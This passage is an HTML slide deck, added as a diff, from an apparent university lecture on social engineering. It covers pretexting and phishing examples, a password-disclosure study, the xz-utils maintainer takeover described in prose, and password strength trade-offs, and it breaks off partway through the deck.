@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>DADA2026:2 Defence against the Dark Arts Second topic - Social Engineering [H2]</title>
+<meta name="author" content="Hugh Anderson [Q]">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/reveal.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/theme/white.min.css">
+<link rel="stylesheet" href="beamer_Warsaw.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.js"></script>
+<script>document.addEventListener("DOMContentLoaded", function () { const mathElements = document.getElementsByClassName("math"); const macros = {"\\qed": "\\tag*{$\\colorlet{colorsave}{.}\\color{black}\\blacksquare\\color{colorsave}$}", "\\concat": "\\mathbin{\\mathmakebox[\\widthof{${+}\\m@th$}]{+\\hskip-1emplus1fil+}}", "\\myeq": "\\mathrel{\\overset{{\\textsf{def}}}{=}}", "\\raggedright": "\\leftskip=0pt \\rightskip=0pt plus 0cm"}; for (let i = 0; i < mathElements.length; i++) {  const texText = mathElements[i].firstChild;  if (mathElements[i].tagName === "SPAN" && texText && texText.nodeType === 3) {   katex.render(texText.data, mathElements[i], {    displayMode: mathElements[i].classList.contains("display"),    throwOnError: false, macros: macros, fleqn: false   });  } }});</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="title-slide" class="dada-beamer-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-other">Social Engineering</span></div>
+<div class="dada-topbar-right"></div>
+</div>
+<div class="dada-title-content">
+<h1 class="title">DADA2026:2 <br>Defence against the Dark Arts<br>Second topic - Social Engineering [<a href="https://hugh.myddns.me/media/pdfs/HandoutSocialEngineering.pdf">H2</a>]</h1>
+<div class="dada-title-authors">
+<p class="author">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</p>
+<p class="institute">National University of Singapore<br>School of Computing</p>
+<p class="date">May 18, 2026</p>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">1/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Cash cash cash...<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://en.wikipedia.org/wiki/Emmanuel_Nwude">i1</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="center">
+<div class="dada-fbox" style="width: 70%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/cashcashcash.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">2/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Where are we?</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">The topics: Attack surfaces so far...</div>
+<div class="block-content">
+<dl>
+<dt><span><span style="color: gray"><span class="dada-font-footnotesize">Introduction:</span></dt>
+<dd>
+<p></span></span><span style="color: gray"><span class="dada-font-footnotesize"> Warfare,</span></span><span style="color: gray"><span class="dada-font-footnotesize"> with an indistinct enemy.</span></span></p>
+</dd>
+</dl>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<div class="center">
+<div class="dada-fbox" style="width: 95%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><dl><dt><span><span style="color: black"><span class="dada-font-footnotesize">Social</span></span> <span style="color: black"><span class="dada-font-footnotesize">Engineering:</span></dt><dd><p></span></span><span style="color: gray"><span class="dada-font-footnotesize"> </span></span><span style="color: black"><span class="dada-bold"><span class="dada-font-footnotesize">In this session we will look at a range of ways that people are manipulated: phishing, vishing, tricking... We will also be looking at some elements of the fightback against this social engineering.</span></span></span></p></dd></dl></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">3/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide dada-outline-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-other">Social Engineering</span></div>
+<div class="dada-topbar-right"></div>
+</div>
+<h2><span class="dada-title-main">Outline</span></h2>
+<div class="dada-frame-body">
+<div class="dada-toc">
+<div class="dada-toc-grid">
+<div class="dada-toc-sec-cell"><span style="color: blue"><span class="dada-bold">Social Engineering</span></span></div>
+<div class="dada-toc-sub-cell"><ul>
+<li>Manipulating people</li>
+<li>Practical problems: issues in authentication</li>
+<li>Emails, emails, emails</li>
+<li>Some advice...</li>
+</ul></div>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">4/34</div>
+</section>
+<section>
+<section id="social-engineering" class="title-slide slide level1 dada-beamer-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-other">Manipulating people</span><span class="dada-topbar-subsection-other">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-other">Emails, emails, emails</span><span class="dada-topbar-subsection-other">Some advice...</span></div>
+</div>
+<h1>Social Engineering</h1>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">4/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide dada-outline-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-current">Manipulating people</span><span class="dada-topbar-subsection-other">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-other">Emails, emails, emails</span><span class="dada-topbar-subsection-other">Some advice...</span></div>
+</div>
+<h2><span class="dada-title-main">Outline</span></h2>
+<div class="dada-frame-body">
+<div class="dada-toc">
+<div class="dada-toc-grid">
+<div class="dada-toc-sec-cell"><span style="color: blue"><span class="dada-bold">Social Engineering</span></span></div>
+<div class="dada-toc-sub-cell"><ul>
+<li>Manipulating people</li>
+<li><span style="color: lightgray">Practical problems: issues in authentication</span></li>
+<li><span style="color: lightgray">Emails, emails, emails</span></li>
+<li><span style="color: lightgray">Some advice...</span></li>
+</ul></div>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">4/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Landscape: reconnaissance</span></h2>
+<div class="dada-frame-body">
+<div class="center">
+<div class="dada-fbox">
+<img data-src="../images/reconnaissance.png" style="width: auto; height:615px; max-width: none; max-height: none" alt="image">
+</div>
+</div>
+<div class="block">
+<div class="block-title">One slice of the Social Engineering landscape</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">The goals of Social Engineering range over multiple axes of activities.</span><span class="dada-font-footnotesize"> We may be trying reconnaissance,</span><span class="dada-font-footnotesize"> or to manipulate people to do things,</span><span class="dada-font-footnotesize"> or other things.</span><span class="dada-font-footnotesize"> For the reconnaissance goal,</span><span class="dada-font-footnotesize"> we show above a range of tools,</span><span class="dada-font-footnotesize"> identified by level of interaction,</span><span class="dada-font-footnotesize"> mechanism,</span><span class="dada-font-footnotesize"> and age.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">5/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main"><span class="dada-bold">Social Engineering:</span><span class="dada-bold"> the art of manipulating people</span></span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Wikipedia definitions, examples...</div>
+<div class="block-content">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Pretexting:</span></span><span style="color: blue"><span class="dada-font-footnotesize"> </span></span><span class="dada-font-footnotesize">using an invented scenario to </span><span style="color: blue"><span class="dada-font-footnotesize">engage</span></span><span class="dada-font-footnotesize"> a targeted victim to increase the chance the victim will divulge information.</span><span style="color: blue"><span class="dada-font-footnotesize"> An elaborate lie...</span></span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span style="color: red">“</span><span style="color: red"><span class="dada-font-footnotesize">Hello,</span></span><span style="color: red"><span class="dada-font-footnotesize"> this is Alice calling from Microsoft Security Services.</span></span><span style="color: red"><span class="dada-font-footnotesize"> We are recording a security alert with your computer..</span></span><span style="color: red">”</span><span style="color: red"><span class="dada-font-footnotesize">.</span></span></p></div>
+</div>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Phishing:</span></span><span class="dada-font-footnotesize"> attempting to </span><span style="color: blue"><span class="dada-font-footnotesize">acquire information</span></span><span class="dada-font-footnotesize"> such as usernames,</span><span class="dada-font-footnotesize"> passwords,</span><span class="dada-font-footnotesize"> and credit card details by </span><span style="color: blue"><span class="dada-font-footnotesize">masquerading</span></span><span class="dada-font-footnotesize"> as a trustworthy entity...</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span style="color: red">“</span><span style="color: red"><span class="dada-font-footnotesize">Dear valued PayPal Customer,</span></span><span style="color: red"><span class="dada-font-footnotesize"> Due to a policy update we need to verify your PayPal account.</span></span><span style="color: red"><span class="dada-font-footnotesize"> Please download the attached file...</span></span><span style="color: red">”</span><span style="color: red"><span class="dada-font-footnotesize">.</span></span></p></div>
+</div>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span class="dada-font-footnotesize">Recently I got this:</span><span class="dada-font-footnotesize"> </span><span style="color: blue">“</span><span style="color: blue"><span class="dada-font-footnotesize">Thank you for choosing PayPal.</span></span><span style="color: blue"><span class="dada-font-footnotesize"> Our security measures are in line with requirements from the Monetary Authority of Singapore (MAS) to reduce risks of money laundering and terrorist financing.</span></span><span style="color: blue"><span class="dada-font-footnotesize"> ...need you to provide some documents...</span></span><span class="dada-font-footnotesize"> How can we differentiate between them?</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">6/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main"><span class="dada-bold">Social Engineering:</span><span class="dada-bold"> the art of manipulating people</span></span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Examples...</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">336 computer science students at the University of Sydney were sent an email asking them to </span><span style="color: blue"><span class="dada-font-footnotesize">supply</span></span><span class="dada-font-footnotesize"> their </span><span style="color: blue"><span class="dada-font-footnotesize">password</span></span><span class="dada-font-footnotesize"> on the </span><span style="color: blue"><span class="dada-font-footnotesize">pretext</span></span><span class="dada-font-footnotesize"> that it was required to ‘validate’ the password database after a suspected breakin.</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span style="color: red"><span class="dada-font-footnotesize">138 of them returned a valid password.</span></span><span style="color: red"><span class="dada-font-footnotesize"> </span></span><span style="color: blue"><span class="dada-font-footnotesize">Some were suspicious:</span></span><span style="color: blue"><span class="dada-font-footnotesize"> </span></span><span class="dada-font-footnotesize">30 returned an invalid password.</span><span class="dada-font-footnotesize"> 200 changed their passwords.</span><span class="dada-font-footnotesize"> </span></p></div>
+</div>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span class="dada-font-footnotesize">Many </span><span style="color: blue"><span class="dada-font-footnotesize">banks</span></span><span class="dada-font-footnotesize">/businesses </span><span style="color: blue"><span class="dada-font-footnotesize">train</span></span><span class="dada-font-footnotesize"> their </span><span style="color: blue"><span class="dada-font-footnotesize">customers</span></span><span class="dada-font-footnotesize"> to act in </span><span style="color: blue"><span class="dada-font-footnotesize">unsafe</span></span><span class="dada-font-footnotesize"> ways:</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span class="dada-font-footnotesize">It’s</span><span style="color: blue"><span class="dada-font-footnotesize"> not prudent to click on links</span></span><span class="dada-font-footnotesize"> in emails,</span><span class="dada-font-footnotesize"> so if you want to contact your bank you should type in the URL or use a bookmark —</span><span class="dada-font-footnotesize"> yet </span><span style="color: red"><span class="dada-font-footnotesize">banks continue to send out emails with clickable links</span></span><span class="dada-font-footnotesize">.</span><span class="dada-font-footnotesize"> It’s </span><span style="color: blue"><span class="dada-font-footnotesize">not prudent to give out security information</span></span><span class="dada-font-footnotesize"> over the phone to unidentified callers—</span><span class="dada-font-footnotesize"> yet we get phoned by</span><span style="color: red"><span class="dada-font-footnotesize"> bank staff who demand security information without having any well-thought-out means of identifying themselves</span></span><span class="dada-font-footnotesize">.</span></p></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">7/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Wei Tang shows how its done<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/WeiTang.mp4">1</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Wei Tang runs software on the corporate network.</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 80%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/WeiTang.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">8/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Kevin Roose getting vished at Defcon<span class="dada-font-footnotesize"> </span></span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/Defcon.subs.mp4">2</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Kevin loses control of his phone account.</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 80%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/DefconSubs.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">9/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">A social engineering attack on “open source”</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Open source compression library: xz-utils!</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><table><tbody><tr><td style="text-align: center;"><img data-src="../images/dep1.png" style="width: auto; height:756px; max-width: none; max-height: none" alt="image"></td><td style="text-align: left; border-left: 1px solid black;"><span class="dada-emph"><span class="dada-font-footnotesize">The source code for</span></span> <span class="dada-emph">“</span> <span class="dada-emph"><span class="dada-font-footnotesize">open source</span></span> <span class="dada-emph">”</span> <span class="dada-emph"><span class="dada-font-footnotesize">projects is of course open and readable by anyone.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">It would appear that it should be very difficult to inject malicious code into a critical component used by open source (and other) software.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">Surely the millions of people in this community would find new malicious code?</span></span> <hr style="border: none; border-top: 3px solid black; width: 60%; margin: 0.4em 0;"> <span class="dada-emph"><span class="dada-font-footnotesize">When code is compiled,</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">it is run through a series of tests to ensure it is OK.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">The general technique the attackers used was to insert the malicious code into the test software (suitably obfuscated),</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">which would insert the malicious binary code at test time.</span></span></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">10/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">A social engineering attack on xz maintainer</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Stressed maintainer for xz-utils!</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><table><tbody><tr><td style="text-align: center;"><img data-src="../images/dep2.png" style="width: auto; height:756px; max-width: none; max-height: none" alt="image"></td><td style="text-align: left; border-left: 1px solid black;"><span class="dada-emph"><span class="dada-font-footnotesize">Over nearly two years he was engineered to pass on partial control of the distribution to an attacker.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">The attackers took their time.</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">Over 18 months they</span></span> <ul> <li><span class="dada-emph"><span class="dada-font-footnotesize">provided a friendly supporter with excellent programming skills</span></span></li> <li><span class="dada-emph"><span class="dada-font-footnotesize">introduced others who complained</span></span></li> <li><span class="dada-emph"><span class="dada-font-footnotesize">campaigned to have the maintainer replaced.</span></span></li> </ul> <span class="dada-emph"><span class="dada-font-footnotesize">Eventually the friendly supporter was given partial control,</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">and uploaded an injection.</span></span> <hr style="border: none; border-top: 3px solid black; width: 60%; margin: 0.4em 0;"> <span class="dada-emph"><span class="dada-font-footnotesize">The attackers are unknown,</span></span> <span class="dada-emph"><span class="dada-font-footnotesize">but probably are a state organization.</span></span></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">11/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Human strengths and weaknesses</span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Behavioural psychology...</div>
+<div class="block-content">
+<div class="center">
+<div class="dada-fbox" style="width: 95%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><table><tbody><tr><td style="text-align: center;"><img data-src="../images/psychcouch.png" style="width: auto; height:756px; max-width: none; max-height: none" alt="image"></td><td style="text-align: left; border-left: 1px solid black;"><span class="dada-font-footnotesize">For social engineering,</span> <span class="dada-font-footnotesize">it is interesting to study the strengths and weaknesses of humans.</span> <span class="dada-font-footnotesize">What can an attacker/defender exploit?</span> <hr style="border: none; border-top: 3px solid black; width: 50%; margin: 0.4em 0;"> <span class="dada-font-footnotesize">As examples of</span> <span style="color: blue"><span class="dada-font-footnotesize">weaknesses</span></span> <span class="dada-font-footnotesize">,</span> <span class="dada-font-footnotesize">note that we have poor recall,</span> <span class="dada-font-footnotesize">short term memory limited to about 5 choices,</span> <span class="dada-font-footnotesize">and the heart takes over when the head runs out.</span> <span class="dada-font-footnotesize">In addition,</span> <span class="dada-font-footnotesize">we have poor evaluation of risk:</span> <span class="dada-font-footnotesize">we dislike losing $100 more than we like winning $100.</span> <span class="dada-font-footnotesize">We also bow to</span> “ <span class="dada-font-footnotesize">authority</span> ” <span class="dada-font-footnotesize">- even with contrary evidence from our own eyes.</span> <hr style="border: none; border-top: 3px solid black; width: 50%; margin: 0.4em 0;"> <span class="dada-font-footnotesize">As examples of</span> <span style="color: blue"><span class="dada-font-footnotesize">strengths</span></span> <span class="dada-font-footnotesize">,</span> <span class="dada-font-footnotesize">note that we can recognize humans easily,</span> <span class="dada-font-footnotesize">we can detect subtle patterns,</span> <span class="dada-font-footnotesize">and understand nuances of speech.</span></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">12/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide dada-outline-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-other">Manipulating people</span><span class="dada-topbar-subsection-current">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-other">Emails, emails, emails</span><span class="dada-topbar-subsection-other">Some advice...</span></div>
+</div>
+<h2><span class="dada-title-main">Outline</span></h2>
+<div class="dada-frame-body">
+<div class="dada-toc">
+<div class="dada-toc-grid">
+<div class="dada-toc-sec-cell"><span style="color: blue"><span class="dada-bold">Social Engineering</span></span></div>
+<div class="dada-toc-sub-cell"><ul>
+<li><span style="color: lightgray">Manipulating people</span></li>
+<li>Practical problems: issues in authentication</li>
+<li><span style="color: lightgray">Emails, emails, emails</span></li>
+<li><span style="color: lightgray">Some advice...</span></li>
+</ul></div>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">13/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main"><span class="dada-bold">Practical security problems...</span></span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Devices, passwords, fingerprints...</div>
+<div class="block-content">
+<p><span style="color: blue"><span class="dada-font-footnotesize">Something you have,</span></span><span style="color: blue"><span class="dada-font-footnotesize"> something you know,</span></span><span style="color: blue"><span class="dada-font-footnotesize"> something you are...</span></span><span class="dada-font-footnotesize"> (or facetiously:</span><span class="dada-font-footnotesize"> something you once had,</span><span class="dada-font-footnotesize"> something you&#x27;ve forgotten,</span><span class="dada-font-footnotesize"> something you once were).</span></p>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span class="dada-font-footnotesize">Most central is the </span><span style="color: blue"><span class="dada-font-footnotesize">password</span></span><span class="dada-font-footnotesize"> - 4/5/6 digit PINs,</span><span class="dada-font-footnotesize"> 8 (or more) character passwords.</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span class="dada-font-footnotesize">Note that there may be different </span><span style="color: blue"><span class="dada-font-footnotesize">complexity</span></span><span class="dada-font-footnotesize"> requirements.</span><span class="dada-font-footnotesize"> For example a four digit PIN may be OK on an ATM,</span><span class="dada-font-footnotesize"> because the machine can lock the account after (say) three invalid guesses.</span><span class="dada-font-footnotesize"> By contrast a University password should be much longer,</span><span class="dada-font-footnotesize"> because an attacker could attack (brute force) all the 4-digit passwords in a very short time.</span></p></div>
+</div>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span class="dada-font-footnotesize">Anderson is critical of the repeated use of (US) </span><span style="color: blue"><span class="dada-font-footnotesize">social security numbers</span></span><span class="dada-font-footnotesize">,</span><span class="dada-font-footnotesize"> and </span>“<span style="color: blue"><span class="dada-font-footnotesize">your mother&#x27;s maiden name</span></span>”<span class="dada-font-footnotesize"> - it leads to a huge industry of identity theft.</span></p>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">14/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main">Jimmy Kimmel on passwords!</span><span class="hfill-right"><span class="dada-font-footnotesize">[</span><a href="https://hugh.myddns.me/media/movies/Password-1.mp4">3</a><span class="dada-font-footnotesize">]</span></span></h2>
+<div class="dada-frame-body">
+<div class="dada-font-footnotesize">
+<div class="dada-bubble" style="background-color: rgb(128,255,128); width: 80%; margin-left: 0; margin-right: auto;">
+<p><span><span class="dada-font-footnotesize">Californians reveal their passwords.</span></span></p>
+</div>
+</div>
+<div class="center">
+<div class="dada-fbox" style="width: 80%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><div class="center"><p style="text-align: center;"><img class="dada-inline-img" data-src="../images/Password.png" style="height: auto; width:100.0%; max-width: none; max-height: none" alt="image"></p></div></div>
+</div>
+</div>
+<div class="dada-slide-num">15/34</div>
+</section>
+<section class="slide level2">
+<h2><span class="dada-title-main"><span class="dada-bold">Password concerns</span></span></h2>
+<div class="dada-frame-body">
+<div class="block">
+<div class="block-title">Reliability, memorability, disclosure...</div>
+<div class="block-content">
+<p><span class="dada-font-footnotesize">If too long,</span><span class="dada-font-footnotesize"> there may be </span><span style="color: blue"><span class="dada-font-footnotesize">problems in entering the data correctly</span></span><span class="dada-font-footnotesize">,</span><span class="dada-font-footnotesize"> although grouping helps (928377461534518 versus 9283 7746 1534 5198).</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><p><span class="dada-font-footnotesize">If you </span><span style="color: blue"><span class="dada-font-footnotesize">have to remember</span></span><span class="dada-font-footnotesize"> the password,</span><span class="dada-font-footnotesize"> we tend to base passwords on something like our family names or interests,</span><span class="dada-font-footnotesize"> along with a couple of digits.</span><span class="dada-font-footnotesize"> Unfortunately this makes the </span><span style="color: blue"><span class="dada-font-footnotesize">passwords hackable</span></span><span class="dada-font-footnotesize"> - dictionary attacks using words and names and combinations.</span><span style="color: blue"><span class="dada-font-footnotesize"> Forced changes can cause problems</span></span><span class="dada-font-footnotesize"> - for example a password </span>“<span class="dada-font-footnotesize">family</span>”<span class="dada-font-footnotesize">:</span><span class="dada-font-footnotesize"> secret1pass,</span><span class="dada-font-footnotesize"> secret2pass,</span><span class="dada-font-footnotesize"> secret3pass and so on.</span></p></div>
+</div>
+<hr style="border: none; border-top: 3px solid black; width: 100%; margin: 0.4em 0;">
+<p><span class="dada-font-footnotesize">Anderson ran a test,</span><span class="dada-font-footnotesize"> with three groups:</span></p>
+<div class="center">
+<div class="dada-fbox" style="width: 90%; border: 5px solid black; background-color: white; box-sizing: border-box; padding: 3.0pt;"><ol><li><div class="dada-li-text"><span style="color: blue"><span class="dada-font-footnotesize">self chosen</span></span><span class="dada-font-footnotesize"> password.</span><span style="color: blue"><span class="dada-font-footnotesize"> 30% hackable,</span></span><span style="color: blue"><span class="dada-font-footnotesize"> easy to remember</span></span></div></li><li><div class="dada-li-text"><span style="color: blue"><span class="dada-font-footnotesize">Mnemonic</span></span><span class="dada-font-footnotesize"> passphrase</span><span style="color: blue"><span class="dada-font-footnotesize">.</span></span><span style="color: blue"><span class="dada-font-footnotesize"> 10% hackable,</span></span><span style="color: blue"><span class="dada-font-footnotesize"> easy to remember</span></span></div></li><li><div class="dada-li-text"><span class="dada-font-footnotesize">8 characters at </span><span style="color: blue"><span class="dada-font-footnotesize">random.</span></span><span style="color: blue"><span class="dada-font-footnotesize"> 10% hackable,</span></span><span style="color: blue"><span class="dada-font-footnotesize"> hard to remember</span></span></div></li></ol></div>
+</div>
+</div>
+</div>
+</div>
+<div class="dada-slide-num">16/34</div>
+</section>
+<section class="slide level2 dada-beamer-slide dada-outline-slide">
+<div class="dada-topbar">
+<div class="dada-topbar-left"><span class="dada-topbar-current">Social Engineering</span></div>
+<div class="dada-topbar-right"><span class="dada-topbar-subsection-other">Manipulating people</span><span class="dada-topbar-subsection-other">Practical problems: issues in authentication</span><span class="dada-topbar-subsection-current">Emails, emails, emails</span><span class="dada-topbar-subsection-other">Some advice...</span></div>
+</div>
+<h2><span class="dada-title-main">Outline</span></h2>
+<div class="dada-frame-body">
+<div class="dada-toc">
+<div class="dada-toc-grid">
+<div class="dada-toc-sec-cell"><span style="color: blue"><span class="dada-bold">Social Engineering</span></span></div>
+<div class="dada-toc-sub-cell"><ul>
+<li><span style="color: lightgray">Manipulating people</span></li>
+<li><span style="color: lightgray">Practical problems: issues in authentication</span></li>
+<li>Emails, emails, emails</li>
+<li><span style="color: lightgray">Some advice...</span></li>
+</ul></div>
+</div>
+</div>
+</div>
+<div class="dada-bottombar">
+<div class="dada-bottombar-left"><span class="dada-bottombar-text">Hugh Anderson [<a href="https://hugh.myddns.me/Askbox/">Q</a>]</span></div>
+<div class="dada-bottombar-right"><span class="dada-bottombar-text">DADA2026, Social Engineering</span></div>
+</div>
+<img class="dada-logo" src="../images/beamer-nus-logo.png" style="width: 1cm" alt="logo">
+<div class="dada-slide-num">17/34</div>
+</section>
+<section class="slide level2">
